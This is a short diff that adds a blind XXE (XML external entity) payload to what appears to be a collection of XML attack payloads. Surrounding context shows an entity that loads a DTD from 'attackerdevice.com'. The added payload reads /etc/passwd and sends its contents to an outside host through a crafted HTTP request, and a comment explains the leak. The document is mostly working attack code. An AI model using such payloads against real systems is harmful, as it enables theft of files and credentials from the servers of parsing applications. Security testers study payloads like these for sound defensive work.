@@ -17,6 +17,17 @@
 <!ENTITY var2 SYSTEM "http://attackerdevice.com/harmful.dtd" >]>  
 <Test>&var2;</Test>
 
+//  Blind XEE  Payload
+// This type pf payload causes the XML parser to make an HTTP request to an external server, potentially leaking sensitive information
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+<!ELEMENT testdoc ANY >  
+<!ENTITY % data SYSTEM "file:///etc/passwd">                                 #  /etc/passwd  contents assigned to the data entity 
+<!ENTITY % var "<!ENTITY exfil SYSTEM 'http://example.com/?%data;'>">  
+ %var;]>  
+<testdoc>&exfil;</testdoc>
+
 
 
 
